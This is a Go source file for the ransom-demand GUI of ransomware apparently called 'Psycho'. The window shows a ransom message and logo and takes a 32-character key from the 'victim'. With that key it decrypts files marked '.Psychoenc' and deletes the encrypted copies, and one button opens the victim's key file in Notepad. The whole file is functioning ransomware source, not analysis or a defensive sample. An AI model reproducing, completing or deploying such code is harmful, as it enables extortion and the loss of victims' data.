package gui

import (
	"fyne.io/fyne"
	"fyne.io/fyne/widget"
	"fyne.io/fyne/app"
	"fyne.io/fyne/dialog"
	"fyne.io/fyne/canvas"
	"fyne.io/fyne/layout"
	"fyne.io/fyne/driver/desktop"
	"time"
	"errors"
	"os"
	"os/exec"
	"../decryption"
	"../files"
	"../storedata"
	"../psychotheme"
)

//gui struct
type Gui struct {
	rootdir string
	message string
}

//get new gui object
func NewGui(root string, mess string) Gui {
	return Gui {
		rootdir: root,
		message: mess,
	}
} 

//checks the password when victim presses Checkpassword button
func (g *Gui) CheckPassword(t *widget.Entry, w fyne.Window) {
	password := t.Text
	if len(password) != 32 {
		err := errors.New("failed")
		dialog.ShowError(err, w)
	} else {
	dec := decryption.NewDecryption(password, ".Psychoenc")
	if dec.Checktest() {
		prog := dialog.NewProgressInfinite("Please wait ...", "decrypting your files", w)
		go prog.Show()
		scanner := files.NewFiles(g.rootdir, []string{}, 0)
		validfilestodecrypt, _ := scanner.ScanTodecrypt()
		for i := range validfilestodecrypt {
			dec.Decryptfile(validfilestodecrypt[i])
		}
		for i := range validfilestodecrypt {
			os.Remove(validfilestodecrypt[i])
		}
		prog.Hide()
		drv := fyne.CurrentApp().Driver()
		if drv, ok := drv.(desktop.Driver); ok {
			w.Hide()
			splashw := drv.CreateSplashWindow()
			splashw.SetContent(widget.NewLabelWithStyle("Suceed!\nyou got your files back", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}))
			splashw.Show()
			go func() {
				time.Sleep(time.Second * 3)
				splashw.Close()
			}()
			w.Close()
		}
	} else {
		err := errors.New("failed")
		dialog.ShowError(err, w)
	}
}
}

//runs the gui
func (g *Gui) Run() {
	//create new app
	psychoapp := app.New()
	//set our customize theme
	th := psychotheme.NewPsychotheme()
	psychoapp.Settings().SetTheme(th)
	//create new window
	window := psychoapp.NewWindow("Psycho")
	//resize the window
	window.Resize(fyne.NewSize(500, 300))
	window.SetFixedSize(true)

	//create a StaticResource object from our stored data
	iconimageresource := &fyne.StaticResource {
		StaticName: "icon.jpg",
		StaticContent: storedata.Geticondata(),
	}
	//set icon
	window.SetIcon(iconimageresource)
	//create a StaticResource object from logo data
	logoresource := &fyne.StaticResource {
		StaticName: "logo.jpg",
		StaticContent: storedata.Getlogo(),
	}
	logo := canvas.NewImageFromResource(logoresource)
	logo.SetMinSize(fyne.NewSize(150,150))
	//create a hbox ( that contains our logo )
	imagebox := widget.NewHBox(layout.NewSpacer() ,logo, layout.NewSpacer())

	TopLabel := widget.NewLabelWithStyle("Psycho", fyne.TextAlignCenter, fyne.TextStyle{Bold: true})
	
	infolabel := widget.NewLabel(g.message)


	Passwordlabel := widget.NewLabel("Check password:")

	PasswordEntry := widget.NewEntry()
	PasswordEntry.SetPlaceHolder("Password")

	//checks the password when victim presses Checkbutton button
	Checkpasswordbutton := widget.NewButton("check password", func(){
		g.CheckPassword(PasswordEntry, window)
	})

	//Shows the victim key in a notepad window
	victimkeybutton := widget.NewButton("Get victimkey", func() {
		c := exec.Command("notepad.exe", "C:\\Psychodata\\key.PSYCHO")
		go c.Run()
	})

	window.SetContent(widget.NewVBox(TopLabel,imagebox, infolabel, Passwordlabel, PasswordEntry, Checkpasswordbutton, victimkeybutton))
	window.ShowAndRun()
}